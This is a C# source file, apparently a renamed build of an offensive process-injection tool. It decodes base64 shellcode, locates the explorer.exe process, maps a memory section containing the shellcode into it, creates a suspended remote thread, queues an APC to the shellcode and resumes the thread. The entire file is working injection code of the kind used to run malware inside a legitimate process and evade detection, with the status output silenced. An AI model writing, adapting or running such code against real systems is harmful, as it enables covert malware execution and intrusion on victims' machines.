using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace UrbanBishop
{
    class Program
    {
        public static void CastleKingside(String b64_sc, BerlinDefence.PROC_VALIDATION Pv, Int32 ProcId)
        {
            // Read in sc bytes
            BerlinDefence.SC_DATA scd = BerlinDefence.ReadShellcode(b64_sc);
            if (scd.iSize == 0)
            {
                return;
            }

            // Create local section & map view of that section as RW in our process
            BerlinDefence.SECT_DATA LocalSect = BerlinDefence.MapLocalSection(scd.iSize);
            if (!LocalSect.isvalid)
            {
                return;
            }

            // Map section into remote process
            BerlinDefence.SECT_DATA RemoteSect = BerlinDefence.MapRemoteSection(Pv.hProc, LocalSect.hSection, scd.iSize);
            if (!RemoteSect.isvalid)
            {
                return;
            }

            // Write sc to local section
            Marshal.Copy(scd.bScData, 0, LocalSect.pBase, (int)scd.iSize);


            // Find remote thread start address offset from base -> RtlExitUserThread
            IntPtr pFucOffset = BerlinDefence.GetLocalExportOffset("ntdll.dll", "RtlExitUserThread");
            if (pFucOffset == IntPtr.Zero)
            {
                return;
            }

            // Create suspended thread at RtlExitUserThread in remote proc
            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr pRemoteStartAddress = (IntPtr)((Int64)Pv.pNtllBase + (Int64)pFucOffset);
            UInt32 CallResult = BerlinDefence.NtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, Pv.hProc, pRemoteStartAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
            if (hRemoteThread == IntPtr.Zero)
            {
                return;
            }

            // Queue APC
            CallResult = BerlinDefence.NtQueueApcThread(hRemoteThread, RemoteSect.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (CallResult ==  0)
            {
            } else
            {
                return;
            }

            // Resume thread
            UInt32 SuspendCount = 0;
            CallResult = BerlinDefence.NtAlertResumeThread(hRemoteThread, ref SuspendCount);
            if (CallResult == 0)
            {
            } else
            {
            }

        }

        static void Main(string[] args)
        {
            //BerlinDefence.PrintBanner();
                
            try
            {
                String b64ShellCode = Shellcode.b64ShellCode;
                Int32 Proc = BerlinDefence.FindExplorerPID();
                BerlinDefence.PROC_VALIDATION pv = BerlinDefence.ValidateProc(Proc);

            if (!pv.isvalid || pv.hProc == IntPtr.Zero)
                {
                    return;
                } else
                {

                     if (pv.isWow64)
                     {
                         return;
                     }

                    CastleKingside(b64ShellCode, pv, Proc);
                }

            } catch
            {
                BerlinDefence.GetHelp();
            }
        }
    }
}
